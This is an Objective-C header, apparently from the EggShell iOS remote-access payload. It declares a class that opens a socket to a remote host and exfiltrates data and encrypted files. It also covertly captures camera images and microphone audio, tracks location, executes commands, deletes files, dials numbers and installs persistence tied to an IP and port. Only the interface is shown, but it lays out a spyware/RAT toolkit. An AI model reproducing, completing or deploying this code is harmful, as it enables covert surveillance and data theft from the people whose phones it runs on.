//
//espl.h
#include <arpa/inet.h>
#import <AppSupport/CPDistributedMessagingCenter.h>
#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CoreLocation/CoreLocation.h>
#import <CoreFoundation/CFUserNotification.h>
#import "escryptor.h"
#import <MediaPlayer/MediaPlayer.h>
#include "NSData+AESCrypt.h"
#include "SpringBoardServices/SpringBoardServices.h"
#import <UIKit/UIKit.h>

@interface espl:NSObject <AVAudioRecorderDelegate>
@property (nonatomic,strong) AVCaptureSession *session;
@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
@property (nonatomic,retain) AVAudioRecorder *recorder;
@property (retain) NSFileManager *fileManager;
@property (retain) UIDevice *thisUIDevice;
@property (retain) NSString *skey;
@property (retain) NSString *terminator;
@property (retain) CPDistributedMessagingCenter *messagingCenter;
@property (nonatomic,retain) NSTimer *timer;
//socks
extern int sockfd;
-(int)connect:(NSString*)host
             :(long)port;
-(void)sendData:(NSData *)data;
-(void)sendString:(NSString *)string;

//convenience
-(NSString *)forgetFirst:(NSArray *)args;
-(void)blank;

//camera
-(void)camera:(BOOL)isfront;
-(AVCaptureDevice *)frontFacingCameraIfAvailable;
-(AVCaptureDevice *)backFacingCameraIfAvailable;
-(void)setupCaptureSession:(BOOL)isfront;
-(void)captureWithBlock:(void(^)(NSData* imageData))block;

//mic
-(void)mic:(NSString *)arg;
//file management
-(void)directoryList:(NSString *)arg;
-(void)rmFile:(NSString *)arg;
-(void)changeWD:(NSString *)arg;
-(void)sendEncryptedFile:(NSData *)fileData;
-(void)download:(NSString *)arg;
//-(void)encryptFile:(NSString *)arg;
//-(void)decryptFile:(NSString *)arg;

//misc
extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
extern CFStringRef SBSApplicationLaunchingErrorString(int error);
-(void)locate;
-(void)exec:(NSString *)command;
-(void)vibrate;
-(void)say:(NSString *)string;
-(void)displayalert:(const char *)title :(const char *)message;
-(void)alert:(NSArray *)args;
-(void)getPid;
-(void)openURL:(NSString *)arg;
-(void)dial:(NSString *)arg;
-(void)setVolume:(NSString *)arg;
-(void)getVolume;
-(void)isplaying;
-(void)listapps;
-(NSString *)battery;
-(void)sysinfo;
-(void)launchApp:(NSString *)arg;
-(void)persistence:(NSString *)ip :(int)port;
-(void)rmpersistence;

//eggshell pro
-(void)upload:(NSString *)uploadpath;
-(void)mcSendNoReply:(NSString *)command;
-(void)mcSendYesReply:(NSString *)command;
-(void)locationService:(NSString *)arg;

@end

//
